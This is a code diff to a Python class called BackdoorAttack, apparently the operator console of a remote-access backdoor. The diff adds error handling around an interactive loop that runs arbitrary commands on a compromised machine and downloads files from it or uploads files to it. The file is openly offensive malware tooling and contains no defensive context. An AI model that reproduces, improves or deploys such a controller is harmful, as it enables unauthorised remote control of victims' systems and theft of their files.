@@ -196,42 +196,49 @@ class BackdoorAttack:
         while True:
             command = input("\n>> ").split(" ")
 
-            if(command[0] == "back"):
-                print("\nReturning back to main menu...\n")
-                return "back"
+            try:
+                if(command[0] == "back"):
+                    print("\nReturning back to main menu...\n")
+                    return "back"
 
-            elif(command[0] == "quit"):
-                result = self.execute_on_sys(command)
-                self.close_connection()
+                elif(command[0] == "quit"):
+                    result = self.execute_on_sys(command)
+                    self.close_connection()
 
-                print("\nReturning back to main menu...\n")
-                return "quit"
-                
-            elif(command[0] == "download"):
-                data = self.execute_on_sys(command)
+                    print("\nReturning back to main menu...\n")
+                    return "quit"
+                    
+                elif(command[0] == "download"):
+                    data = self.execute_on_sys(command)
 
-                if "Error: File does not exist." in data:
-                    print("\n{}\n".format(data))
+                    if "Error: File does not exist." in data:
+                        print("\n{}\n".format(data))
 
-                else:
-                    path = command[2] if(len(command) > 2) else command[1]
-                    result = self.write_file(path, data)
-                    print("\n{}\n".format(result))
+                    else:
+                        path = command[2] if(len(command) > 2) else command[1]
+                        result = self.write_file(path, data)
+                        print("\n{}\n".format(result))
 
-            elif(command[0] == "upload"):
-                data = self.read_file(command[1])
+                elif(command[0] == "upload"):
+                    data = self.read_file(command[1])
 
-                if "Error: File does not exist." in data:
-                    print("\n{}\n".format(data))
+                    if "Error: File does not exist." in data:
+                        print("\n{}\n".format(data))
 
-                else:
-                    command.append(data)
+                    else:
+                        command.append(data)
+                        result = self.execute_on_sys(command)
+                        print("\n{}\n".format(result))
+
+                else:    
                     result = self.execute_on_sys(command)
                     print("\n{}\n".format(result))
-
-            else:    
-                result = self.execute_on_sys(command)
-                print("\n{}\n".format(result))
+            
+            except:
+                print("\n\nUnable to connect with {}...".format(self.address[0]))
+                print("\nReturning back to main menu...\n")
+                self.close_connection()
+                return "quit"               
 
 
 """ 
